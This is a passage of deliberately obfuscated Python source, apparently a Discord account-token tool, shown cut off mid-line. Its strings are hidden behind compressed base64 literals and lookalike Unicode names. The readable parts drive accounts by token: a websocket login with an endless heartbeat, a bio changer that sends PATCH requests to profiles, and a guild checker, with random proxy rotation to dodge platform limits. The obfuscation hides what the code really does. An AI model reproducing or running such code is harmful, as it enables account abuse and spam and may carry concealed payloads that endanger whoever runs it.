__𝘪𝘮𝙥𝙤𝙧𝘵__(𝘭𝘔𝙄𝘐𝗠𝙡𝗠𝘕𝙄𝘐𝗡𝗠𝙡𝘭𝙄𝘔𝗹𝘔𝗹𝙄𝘔𝙄𝗠𝘐𝗡𝗠𝙄𝙡𝗹𝙡𝘕𝘭[𝙧𝘰𝘶𝗻𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__(𝙡𝗠𝙄𝙄𝗠𝘭𝙈𝙉𝘐𝘐𝗡𝙈𝙡𝙡𝙄𝙈𝘭𝙈𝙡𝗜𝙈𝗜𝘔𝙄𝙉𝘔𝙄𝘭𝗹𝙡𝗡𝙡[𝗿𝙤𝙪𝙣𝗱(𝗮𝗯𝘀(0.39793314235837096 + 0.9174144179228886j))]).decompress(b'x\xda\x8b4\xb2,I\xf6\xf0\xcaI6\xf6\xb5\x05\x00\x18\x90\x03\xba')).decode(): False, __𝙞𝙢𝗽𝙤𝙧𝙩__(𝘭𝘔𝘐𝗜𝗠𝙡𝙈𝗡𝗜𝗜𝘕𝙈𝘭𝙡𝗜𝗠𝙡𝘔𝙡𝘐𝘔𝙄𝘔𝗜𝘕𝙈𝗜𝘭𝘭𝗹𝘕𝘭[𝗿𝙤𝘂𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝘳𝘵__(𝘭𝙈𝘐𝘐𝗠𝘭𝘔𝘕𝙄𝘐𝘕𝗠𝙡𝙡𝗜𝘔𝗹𝘔𝙡𝙄𝘔𝘐𝙈𝘐𝘕𝙈𝘐𝙡𝗹𝗹𝙉𝙡[𝗿𝗼𝘶𝘯𝙙(𝘢𝘣𝘀(0.888817761312632 + 0.45826082875934426j))]).decompress(b'x\xda\x8b4\xaa(\x88\n75\x880\xf63\x88\x8c\x08\xca\x01\x00*\xea\x05\x02')).decode(): {__𝘪𝗺𝗽𝘰𝘳𝙩__(𝘭𝘔𝘐𝗜𝗠𝙡𝗠𝘕𝙄𝘐𝗡𝙈𝘭𝘭𝘐𝘔𝗹𝘔𝗹𝙄𝗠𝙄𝗠𝗜𝗡𝘔𝗜𝙡𝘭𝗹𝗡𝘭[𝗿𝗼𝙪𝗻𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝗼𝗿𝙩__(𝗹𝗠𝙄𝙄𝗠𝗹𝙈𝙉𝗜𝘐𝘕𝗠𝘭𝙡𝘐𝙈𝙡𝙈𝗹𝙄𝙈𝙄𝗠𝘐𝘕𝙈𝗜𝙡𝗹𝗹𝘕𝗹[𝙧𝘰𝘂𝘯𝗱(𝘢𝗯𝘀(0.5745768111008125 + 0.8184506632321958j))]).decompress(b'x\xda\x8b2\x0e+Hr\x0fJKtw\xabJt\x0f\xab\x02\x00-\xfe\x05\x95')).decode(): {}, __𝙞𝗺𝙥𝗼𝘳𝘵__(𝙡𝙈𝗜𝘐𝙈𝗹𝙈𝙉𝙄𝗜𝙉𝙈𝙡𝘭𝘐𝗠𝘭𝗠𝙡𝗜𝘔𝘐𝙈𝙄𝙉𝙈𝘐𝙡𝙡𝙡𝘕𝗹[𝘳𝗼𝘶𝗻𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝗼𝗿𝘵__(𝘭𝘔𝘐𝙄𝙈𝘭𝙈𝗡𝙄𝗜𝙉𝙈𝘭𝘭𝗜𝗠𝘭𝘔𝗹𝘐𝙈𝗜𝗠𝗜𝙉𝘔𝗜𝘭𝗹𝙡𝙉𝙡[𝙧𝘰𝙪𝗻𝗱(𝘢𝙗𝘴(0.26984166544979826 + 0.9629047074281438j))]).decompress(b'x\xdaKt\xcf\xc9Kt\x0f\xabJq\xb3,\x8e\x8c\xf03\x8802\xccI6\xf6\xcb\x882\nKK\x0c\x0f\xb4\x05\x00\xb2\x96\n\x81')).decode(): __𝘪𝙢𝘱𝙤𝘳𝘵__(𝗹𝗠𝙄𝘐𝘔𝙡𝙈𝙉𝙄𝘐𝙉𝙈𝘭𝙡𝙄𝙈𝗹𝗠𝙡𝙄𝘔𝙄𝗠𝙄𝗡𝘔𝙄𝙡𝘭𝘭𝙉𝗹[𝙧𝗼𝘶𝗻𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__(𝙡𝘔𝗜𝗜𝘔𝘭𝗠𝘕𝘐𝘐𝗡𝘔𝙡𝗹𝙄𝙈𝘭𝙈𝙡𝘐𝘔𝗜𝘔𝙄𝘕𝗠𝘐𝘭𝘭𝗹𝘕𝙡[𝘳𝗼𝙪𝙣𝘥(𝙖𝘣𝙨(0.3197013565853498 + 0.9475183600318714j))]).decompress(b'x\xda\xf3u\xb4\xb5\x05\x00\x02\xb2\x01\t')).decode(), __𝘪𝙢𝘱𝘰𝙧𝘵__(𝗹𝘔𝗜𝗜𝘔𝙡𝘔𝘕𝗜𝘐𝘕𝙈𝗹𝗹𝙄𝙈𝘭𝙈𝗹𝘐𝙈𝙄𝘔𝗜𝙉𝘔𝗜𝘭𝗹𝙡𝘕𝙡[𝘳𝗼𝘶𝙣𝘥(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝘰𝙧𝘁__(𝗹𝙈𝗜𝙄𝗠𝗹𝙈𝗡𝘐𝙄𝗡𝙈𝙡𝘭𝗜𝙈𝘭𝗠𝗹𝙄𝗠𝗜𝘔𝘐𝗡𝘔𝗜𝘭𝗹𝙡𝗡𝘭[𝘳𝙤𝘶𝙣𝙙(𝗮𝙗𝘴(0.3931281826552072 + 0.9194836768546868j))]).decompress(b'x\xdaK\xce\r\xcb\x88r\xb3\xacJqw3\x88\n\xb34\x8a\x8a\xf0\xaaJ\x0c\xb7,\x05\x00d\xc6\x07\xfa')).decode(): 𝘳𝗼𝙪𝙣𝗱(𝗮𝗯𝘀(0.0 + 0j)), __𝗶𝙢𝙥𝙤𝗿𝘵__(𝗹𝗠𝗜𝘐𝗠𝗹𝗠𝗡𝙄𝘐𝗡𝗠𝗹𝘭𝘐𝘔𝙡𝘔𝗹𝗜𝙈𝙄𝙈𝗜𝗡𝙈𝘐𝘭𝙡𝙡𝘕𝘭[𝙧𝗼𝘶𝙣𝙙(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__(𝘭𝘔𝙄𝘐𝗠𝗹𝙈𝙉𝗜𝙄𝗡𝘔𝗹𝗹𝘐𝗠𝘭𝙈𝘭𝙄𝗠𝗜𝙈𝙄𝘕𝘔𝗜𝙡𝗹𝘭𝘕𝙡[𝙧𝘰𝙪𝗻𝗱(𝘢𝘣𝘀(0.9309124263700176 + 0.3652424597851222j))]).decompress(b'x\xdaK\x89\xf0\xcbI\xce\xb1\xccK\t\xcf)\x8er\xb3\xac\x8a\x8a\x082H\x0c7\xcdK6\xb44\x8a\x8a\xf0\xaaJ\x0c\xb7,\x05\x00\xe8\xb8\x0cD')).decode(): -𝘳𝗼𝘶𝘯𝘥(𝙖𝙗𝘀(0.07873150430163678 + 0.9968958572641384j))}}}
    𝘸𝙨.send(𝗷𝘴𝙤𝘯.dumps(𝘢𝘶𝘵𝘩))
    while True:
        𝘩𝘦𝘢𝘳𝘵𝙗𝗲𝘢𝙩𝙅𝗦𝙊𝘕 = {__𝙞𝘮𝗽𝙤𝙧𝙩__(𝘭𝙈𝘐𝙄𝗠𝙡𝙈𝗡𝘐𝗜𝘕𝘔𝙡𝙡𝙄𝗠𝗹𝙈𝘭𝙄𝗠𝙄𝘔𝘐𝙉𝙈𝘐𝙡𝘭𝘭𝙉𝗹[𝗿𝙤𝙪𝙣𝗱(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝗿𝙩__(𝘭𝙈𝘐𝗜𝙈𝘭𝙈𝙉𝙄𝙄𝗡𝘔𝙡𝙡𝗜𝗠𝘭𝘔𝙡𝙄𝘔𝘐𝗠𝗜𝗡𝙈𝗜𝘭𝗹𝗹𝙉𝙡[𝗿𝗼𝘂𝘯𝙙(𝗮𝘣𝙨(0.4064128860522638 + 0.9136895348260643j))]).decompress(b'x\xdaK2v\xb4\x05\x00\x02\xe4\x01\x14')).decode(): 𝙧𝘰𝘶𝙣𝘥(𝘢𝙗𝙨(0.28605685280455806 + 0.958212647048426j)), __𝘪𝗺𝗽𝙤𝗿𝙩__(𝗹𝘔𝘐𝗜𝙈𝘭𝙈𝙉𝙄𝘐𝙉𝙈𝗹𝗹𝙄𝗠𝙡𝙈𝗹𝙄𝗠𝗜𝙈𝗜𝗡𝙈𝙄𝘭𝗹𝙡𝙉𝘭[𝗿𝗼𝘂𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝙧𝙩__(𝘭𝙈𝙄𝘐𝗠𝙡𝗠𝗡𝙄𝙄𝙉𝗠𝗹𝙡𝙄𝙈𝗹𝘔𝙡𝗜𝘔𝙄𝗠𝗜𝘕𝘔𝗜𝗹𝗹𝗹𝘕𝗹[𝘳𝗼𝘂𝙣𝗱(𝗮𝙗𝘀(0.3587833410024315 + 0.9334208666079481j))]).decompress(b'x\xdaKq\xb7,\x8a\n7\xb1\x05\x00\x0b\xbb\x02y')).decode(): 𝙩𝙤𝗸𝙚𝙣, __𝗶𝙢𝗽𝙤𝙧𝙩__(𝘭𝘔𝗜𝘐𝘔𝘭𝗠𝘕𝘐𝘐𝙉𝘔𝙡𝙡𝘐𝗠𝗹𝙈𝗹𝗜𝗠𝗜𝙈𝘐𝘕𝘔𝙄𝗹𝘭𝗹𝙉𝘭[𝗿𝗼𝙪𝗻𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝗼𝘳𝘵__(𝙡𝙈𝗜𝗜𝙈𝙡𝗠𝗡𝙄𝘐𝘕𝙈𝘭𝗹𝗜𝗠𝘭𝘔𝘭𝘐𝘔𝙄𝙈𝗜𝗡𝗠𝙄𝙡𝙡𝗹𝗡𝘭[𝘳𝙤𝙪𝘯𝘥(𝘢𝘣𝘀(0.8970916013536141 + 0.44184460931509434j))]).decompress(b'x\xda\x8br\xb4\xb5\x05\x00\x02\xe6\x01\x16')).decode(): __𝙞𝗺𝘱𝙤𝘳𝘵__(𝘭𝘔𝘐𝘐𝗠𝘭𝘔𝘕𝘐𝗜𝙉𝗠𝘭𝙡𝘐𝗠𝙡𝗠𝙡𝗜𝙈𝗜𝗠𝙄𝙉𝙈𝘐𝘭𝗹𝘭𝘕𝙡[𝘳𝙤𝘂𝙣𝗱(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝙤𝗿𝙩__(𝘭𝘔𝗜𝙄𝙈𝗹𝘔𝙉𝙄𝘐𝗡𝙈𝘭𝗹𝘐𝙈𝙡𝗠𝗹𝘐𝗠𝗜𝙈𝙄𝗡𝗠𝘐𝘭𝗹𝗹𝘕𝗹[𝘳𝘰𝘶𝙣𝙙(𝙖𝙗𝘴(0.41903699361966307 + 0.9079691613585752j))]).decompress(b'x\xdaK\xca\x0b+Nr\xb4\xb5\x05\x00\r_\x02\xb7')).decode()}
        𝙬𝙨.send(𝗷𝘀𝗼𝙣.dumps(𝙝𝘦𝘢𝗿𝘁𝗯𝘦𝙖𝘁𝗝𝗦𝙊𝘕))
        𝘀𝗹𝘦𝙚𝗽(𝙝𝗲𝗮𝘳𝘁𝘣𝘦𝘢𝘁_𝗶𝗻𝘵𝙚𝘳𝘷𝗮𝙡)

def bio_changer(token, bio):
    𝗵𝗲𝙖𝗱𝙚𝗿𝙨 = 𝙃𝗲𝘢𝘥𝙚𝙧𝘴(𝘁𝙤𝘬𝗲𝘯)
    𝗽𝗮𝘆𝙡𝘰𝗮𝗱 = {__𝙞𝗺𝘱𝗼𝗿𝙩__(𝘭𝙈𝗜𝙄𝙈𝗹𝙈𝗡𝘐𝙄𝙉𝙈𝙡𝙡𝗜𝙈𝙡𝘔𝗹𝘐𝘔𝘐𝘔𝘐𝘕𝗠𝙄𝗹𝘭𝘭𝗡𝗹[𝘳𝙤𝘶𝙣𝗱(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝙧𝘁__(𝗹𝙈𝗜𝙄𝘔𝙡𝗠𝗡𝘐𝘐𝗡𝘔𝗹𝘭𝗜𝙈𝗹𝘔𝙡𝗜𝙈𝗜𝘔𝙄𝗡𝙈𝗜𝙡𝘭𝘭𝗡𝘭[𝗿𝘰𝘶𝗻𝘥(𝘢𝙗𝘀(0.34606222133446496 + 0.9382115640755319j))]).decompress(b'x\xda\x8b\xcc\xcd)\x03\x00\x03\xfd\x01\xa9')).decode(): 𝙗𝗶𝗼}
    𝙙𝘯 = 𝘁𝘰𝙠𝘦𝙣.split(__𝙞𝗺𝘱𝘰𝙧𝙩__(𝘭𝘔𝙄𝗜𝙈𝗹𝘔𝙉𝘐𝗜𝗡𝙈𝗹𝙡𝗜𝙈𝙡𝗠𝙡𝗜𝗠𝗜𝘔𝙄𝗡𝘔𝗜𝗹𝘭𝗹𝗡𝗹[𝘳𝘰𝙪𝗻𝘥(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__(𝙡𝙈𝗜𝙄𝗠𝘭𝙈𝙉𝗜𝘐𝘕𝘔𝙡𝙡𝗜𝗠𝙡𝘔𝘭𝙄𝗠𝙄𝘔𝙄𝗡𝙈𝙄𝙡𝙡𝙡𝗡𝙡[𝘳𝗼𝙪𝗻𝘥(𝙖𝘣𝘀(0.01599053620182489 + 0.9998721432023087j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝘯𝘯 = 𝗱𝘯[𝘳𝙤𝙪𝘯𝘥(𝗮𝘣𝘴(0.0 + 0j))]
    if 𝙥𝙧𝗼𝙭𝙮:
        𝗿𝘳 = 𝗿𝙚𝗾𝙪𝘦𝘴𝙩𝘀.patch(__𝗶𝘮𝙥𝙤𝗿𝘵__(𝗹𝗠𝗜𝗜𝘔𝘭𝗠𝙉𝗜𝗜𝘕𝘔𝙡𝙡𝙄𝘔𝗹𝗠𝗹𝙄𝗠𝘐𝙈𝘐𝗡𝘔𝙄𝘭𝘭𝗹𝗡𝘭[𝙧𝗼𝘶𝘯𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__(𝘭𝘔𝘐𝙄𝗠𝘭𝘔𝙉𝘐𝙄𝘕𝗠𝘭𝗹𝘐𝘔𝙡𝙈𝗹𝘐𝗠𝗜𝗠𝙄𝙉𝙈𝘐𝘭𝙡𝙡𝘕𝙡[𝗿𝘰𝙪𝗻𝙙(𝘢𝘣𝘀(0.7331368059358399 + 0.6800811891106786j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x1fc\xa7\xca$\xa3\xa8\x82$\xf7P[\x00p\xe4\x14\x9d')).decode(), headers=𝗵𝙚𝙖𝙙𝘦𝘳𝘀, json=𝘱𝘢𝙮𝙡𝗼𝘢𝗱, proxy={__𝗶𝗺𝙥𝙤𝗿𝘁__(𝙡𝘔𝗜𝗜𝙈𝗹𝙈𝗡𝗜𝘐𝘕𝘔𝗹𝙡𝗜𝙈𝗹𝘔𝗹𝘐𝘔𝙄𝘔𝙄𝘕𝙈𝙄𝘭𝙡𝘭𝘕𝗹[𝘳𝘰𝘂𝘯𝘥(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__(𝗹𝙈𝙄𝘐𝘔𝘭𝙈𝘕𝗜𝙄𝙉𝗠𝗹𝗹𝘐𝗠𝗹𝙈𝙡𝘐𝙈𝗜𝘔𝙄𝘕𝘔𝘐𝘭𝘭𝗹𝙉𝘭[𝘳𝙤𝘶𝘯𝗱(𝙖𝗯𝙨(0.08847707830358487 + 0.9960782131011908j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝙞𝗺𝙥𝗼𝘳𝙩__(𝙡𝙈𝗜𝘐𝗠𝘭𝙈𝙉𝘐𝘐𝘕𝗠𝙡𝙡𝗜𝘔𝘭𝗠𝘭𝙄𝗠𝘐𝘔𝗜𝗡𝙈𝙄𝘭𝙡𝘭𝗡𝙡[𝗿𝙤𝘂𝙣𝙙(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝙤𝗿𝙩__(𝗹𝙈𝗜𝘐𝙈𝗹𝘔𝙉𝙄𝗜𝗡𝗠𝙡𝗹𝙄𝙈𝗹𝘔𝙡𝙄𝗠𝘐𝙈𝗜𝗡𝙈𝘐𝗹𝘭𝘭𝗡𝙡[𝗿𝗼𝘂𝘯𝘥(𝙖𝘣𝘀(0.944460844066953 + 0.32862397055652953j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝗮𝙣𝘥𝘰𝙢.choice(𝘱𝘳𝗼𝘹𝙞𝙚𝙨), __𝗶𝗺𝙥𝙤𝙧𝙩__(𝘭𝙈𝗜𝘐𝗠𝙡𝘔𝗡𝙄𝘐𝘕𝘔𝗹𝙡𝗜𝗠𝗹𝗠𝗹𝗜𝙈𝘐𝙈𝙄𝘕𝘔𝘐𝗹𝘭𝘭𝘕𝗹[𝗿𝘰𝘂𝙣𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝘰𝙧𝙩__(𝙡𝗠𝗜𝙄𝘔𝘭𝘔𝘕𝙄𝘐𝗡𝘔𝘭𝙡𝘐𝘔𝗹𝗠𝘭𝙄𝗠𝙄𝙈𝘐𝘕𝗠𝘐𝗹𝘭𝘭𝙉𝗹[𝗿𝗼𝘂𝘯𝗱(𝙖𝙗𝙨(0.013635768407037063 + 0.9999070285881332j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝙞𝙢𝙥𝘰𝙧𝘁__(𝘭𝘔𝗜𝘐𝘔𝙡𝘔𝙉𝘐𝙄𝘕𝘔𝘭𝘭𝘐𝗠𝙡𝘔𝗹𝗜𝗠𝗜𝙈𝙄𝘕𝗠𝙄𝙡𝘭𝗹𝙉𝘭[𝗿𝙤𝘶𝙣𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝙧𝙩__(𝙡𝗠𝙄𝗜𝘔𝘭𝗠𝘕𝗜𝘐𝘕𝘔𝗹𝗹𝗜𝙈𝙡𝙈𝘭𝘐𝘔𝗜𝗠𝗜𝘕𝘔𝙄𝙡𝙡𝘭𝗡𝘭[𝗿𝘰𝙪𝗻𝙙(𝙖𝘣𝘀(0.06252510805575584 + 0.9980433912724517j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝘢𝘯𝗱𝗼𝘮.choice(𝗽𝙧𝗼𝘹𝗶𝘦𝘀)})
    else:
        𝗿𝙧 = 𝙧𝘦𝗾𝘶𝗲𝘴𝘁𝘀.patch(__𝗶𝘮𝙥𝘰𝘳𝘁__(𝘭𝗠𝗜𝗜𝗠𝗹𝙈𝙉𝘐𝗜𝘕𝗠𝙡𝙡𝘐𝙈𝗹𝙈𝗹𝗜𝙈𝘐𝗠𝙄𝘕𝙈𝙄𝗹𝗹𝙡𝘕𝙡[𝗿𝗼𝘶𝗻𝘥(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝙧𝘁__(𝘭𝘔𝘐𝙄𝗠𝗹𝘔𝘕𝗜𝙄𝗡𝗠𝙡𝘭𝗜𝗠𝘭𝙈𝗹𝙄𝘔𝙄𝗠𝗜𝘕𝗠𝘐𝙡𝙡𝗹𝘕𝘭[𝙧𝗼𝘂𝙣𝘥(𝗮𝗯𝙨(0.28521398051988556 + 0.9584638675067529j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\x02\xe2\x08\xbf\x9c\xe4<\xdf\xb2@w\xc3\x1c\x1fc\xa7\xca$\xa3\xa8\x82$\xf7P[\x00p\xe4\x14\x9d')).decode(), headers=𝘩𝗲𝙖𝗱𝘦𝘳𝘀, json=𝘱𝘢𝘆𝘭𝗼𝙖𝗱)
    if 𝗿𝗿.status_code == 𝗿𝗼𝘶𝙣𝗱(𝙖𝗯𝘀(25.50923756737471 + 198.36652640687956j)):
        𝗽𝗿𝘪𝗻𝘵(__𝙞𝘮𝗽𝗼𝘳𝙩__(𝙡𝗠𝘐𝗜𝗠𝗹𝗠𝗡𝗜𝘐𝗡𝗠𝙡𝙡𝗜𝘔𝗹𝗠𝘭𝘐𝙈𝘐𝘔𝙄𝙉𝗠𝙄𝘭𝘭𝙡𝙉𝗹[𝘳𝙤𝘂𝗻𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝗼𝗿𝘁__(𝘭𝙈𝘐𝗜𝗠𝙡𝙈𝗡𝘐𝙄𝙉𝗠𝘭𝙡𝙄𝗠𝙡𝗠𝘭𝘐𝗠𝙄𝙈𝙄𝗡𝘔𝙄𝗹𝘭𝗹𝙉𝘭[𝗿𝗼𝙪𝗻𝗱(𝘢𝙗𝘀(0.7126401633390248 + 0.7015297553177114j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfc\xdb\x0c\xa3')).decode().format(𝙧, 𝘥𝗮𝘵𝗲𝙩𝙞𝙢𝗲.datetime.now().strftime(f"{𝗴}{__𝙞𝗺𝗽𝗼𝗿𝙩__(𝙡𝗠𝘐𝘐𝗠𝙡𝙈𝘕𝘐𝙄𝙉𝙈𝙡𝗹𝘐𝘔𝗹𝙈𝗹𝘐𝗠𝗜𝘔𝗜𝘕𝗠𝙄𝘭𝘭𝙡𝙉𝗹[𝙧𝗼𝙪𝙣𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝗿, 𝙡𝘤, 𝙧, 𝘯𝙣, 𝘨))
    else:
        𝗽𝙧𝙞𝙣𝘁(__𝘪𝗺𝘱𝗼𝘳𝘁__(𝙡𝗠𝙄𝙄𝙈𝗹𝙈𝗡𝗜𝘐𝙉𝗠𝙡𝙡𝗜𝘔𝙡𝙈𝗹𝘐𝙈𝙄𝘔𝗜𝘕𝘔𝗜𝘭𝙡𝗹𝘕𝗹[𝙧𝘰𝘶𝘯𝘥(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝗼𝘳𝙩__(𝘭𝘔𝙄𝙄𝘔𝙡𝘔𝘕𝘐𝘐𝙉𝙈𝘭𝗹𝘐𝙈𝘭𝗠𝘭𝗜𝘔𝗜𝙈𝘐𝙉𝘔𝙄𝗹𝙡𝗹𝘕𝘭[𝘳𝘰𝘶𝘯𝙙(𝗮𝙗𝘴(0.2894378522995422 + 0.9571968082146056j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝘳, 𝘥𝗮𝘁𝘦𝙩𝙞𝘮𝘦.datetime.now().strftime(f"{𝗴}{__𝙞𝗺𝙥𝙤𝙧𝘵__(𝘭𝗠𝙄𝙄𝗠𝘭𝗠𝙉𝘐𝘐𝙉𝗠𝘭𝗹𝙄𝗠𝙡𝙈𝘭𝗜𝗠𝗜𝘔𝘐𝙉𝙈𝗜𝗹𝘭𝘭𝗡𝘭[𝙧𝗼𝘶𝘯𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝙧, 𝗯, 𝗿, 𝘯𝗻, 𝗴, 𝗿𝗿.text))

def check_guild(token, guildid):
    try:
        𝙝𝙚𝙖𝙙𝙚𝘳𝘴 = {__𝙞𝙢𝙥𝘰𝙧𝘵__(𝘭𝙈𝗜𝙄𝗠𝙡𝗠𝗡𝘐𝗜𝙉𝗠𝗹𝙡𝙄𝘔𝘭𝙈𝙡𝘐𝘔𝘐𝗠𝙄𝘕𝙈𝗜𝗹𝗹𝗹𝙉𝙡[𝙧𝙤𝘶𝗻𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝘳𝘁__(𝙡𝘔𝙄𝗜𝙈𝙡𝙈𝗡𝗜𝘐𝘕𝙈𝙡𝙡𝙄𝗠𝗹𝗠𝙡𝘐𝗠𝙄𝗠𝘐𝙉𝙈𝙄𝘭𝘭𝗹𝙉𝗹[𝙧𝙤𝘂𝗻𝘥(𝗮𝙗𝙨(0.5500139401904222 + 0.8351554739066294j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xacL\x8c(\xc8Hq\xcf)KJ\xb7\xb5\x05\x00G\xff\x06\xf3')).decode(): 𝘁𝘰𝘬𝘦𝗻}
        if 𝘱𝘳𝘰𝙭𝙮:
            𝘳𝘦𝘀𝗽𝘰𝙣𝘴𝙚 = 𝙧𝙚𝘲𝙪𝗲𝙨𝘁𝙨.get(__𝘪𝘮𝘱𝗼𝙧𝙩__(𝗹𝘔𝘐𝘐𝘔𝙡𝘔𝙉𝙄𝙄𝗡𝗠𝘭𝘭𝙄𝗠𝙡𝗠𝗹𝗜𝗠𝙄𝙈𝗜𝗡𝗠𝗜𝘭𝙡𝘭𝗡𝙡[𝗿𝘰𝙪𝗻𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝗿𝙩__(𝘭𝗠𝗜𝗜𝙈𝘭𝘔𝗡𝘐𝘐𝗡𝗠𝗹𝗹𝗜𝗠𝙡𝗠𝙡𝘐𝙈𝘐𝗠𝗜𝗡𝙈𝙄𝙡𝙡𝘭𝗡𝗹[𝙧𝘰𝘂𝗻𝗱(𝗮𝗯𝙨(0.24197387217266153 + 0.9702827655821619j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b2\x0e+Hr\x0f\xaa\xf21.\xb1\x04\x00\x8cJ\x10\x7f')).decode().format(𝙜𝘶𝗶𝙡𝘥𝙞𝗱), headers=𝙝𝘦𝘢𝘥𝗲𝗿𝘴, proxy={__𝙞𝗺𝙥𝗼𝘳𝘵__(𝗹𝗠𝗜𝗜𝙈𝗹𝙈𝙉𝙄𝗜𝗡𝙈𝗹𝘭𝗜𝙈𝗹𝗠𝗹𝘐𝙈𝘐𝙈𝘐𝙉𝘔𝘐𝘭𝘭𝙡𝙉𝙡[𝙧𝘰𝙪𝗻𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝘰𝘳𝘁__(𝘭𝗠𝘐𝘐𝙈𝙡𝘔𝗡𝙄𝗜𝗡𝘔𝘭𝘭𝘐𝘔𝙡𝙈𝘭𝙄𝗠𝙄𝙈𝙄𝘕𝘔𝙄𝘭𝙡𝙡𝙉𝘭[𝘳𝘰𝙪𝗻𝙙(𝘢𝗯𝙨(0.04458193635069907 + 0.9990057311903783j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝙞𝙢𝙥𝘰𝙧𝙩__(𝗹𝘔𝘐𝙄𝗠𝗹𝘔𝙉𝙄𝘐𝘕𝗠𝙡𝘭𝘐𝘔𝘭𝗠𝘭𝗜𝘔𝘐𝗠𝗜𝘕𝘔𝙄𝗹𝙡𝗹𝙉𝙡[𝙧𝙤𝘶𝘯𝙙(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝙧𝘵__(𝘭𝗠𝘐𝘐𝙈𝙡𝙈𝙉𝗜𝙄𝗡𝗠𝙡𝙡𝙄𝗠𝗹𝘔𝘭𝗜𝙈𝘐𝘔𝗜𝙉𝗠𝙄𝗹𝙡𝗹𝘕𝗹[𝘳𝙤𝙪𝘯𝘥(𝙖𝘣𝘴(0.278718256772165 + 0.9603729136860771j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝗮𝗻𝙙𝘰𝘮.choice(𝗽𝗿𝘰𝘅𝗶𝙚𝙨), __𝘪𝘮𝗽𝗼𝙧𝘁__(𝗹𝘔𝗜𝗜𝘔𝙡𝗠𝗡𝘐𝙄𝘕𝙈𝗹𝘭𝗜𝙈𝙡𝙈𝗹𝘐𝘔𝗜𝙈𝗜𝙉𝙈𝘐𝗹𝗹𝘭𝘕𝘭[𝗿𝗼𝘶𝘯𝙙(𝘢𝗯𝘴(0.0 + 